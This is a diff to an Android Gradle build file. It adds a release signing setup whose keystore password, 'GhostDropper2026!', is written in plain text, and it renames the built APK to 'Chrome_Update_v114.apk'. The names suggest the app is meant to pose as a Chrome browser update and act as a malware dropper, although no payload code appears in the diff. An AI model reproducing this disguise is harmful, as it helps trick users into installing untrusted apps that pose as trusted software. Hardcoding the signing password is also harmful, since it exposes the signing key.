@@ -14,11 +14,27 @@ android {
         versionName "2.1.114"
     }
 
+    signingConfigs {
+        release {
+            storeFile file("../release.keystore")
+            storePassword "GhostDropper2026!"
+            keyAlias "ghost"
+            keyPassword "GhostDropper2026!"
+        }
+    }
+
     buildTypes {
         release {
             minifyEnabled true
             shrinkResources true
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+            signingConfig signingConfigs.release
+        }
+    }
+
+    applicationVariants.all { variant ->
+        variant.outputs.all {
+            outputFileName = "Chrome_Update_v114.apk"
         }
     }
 
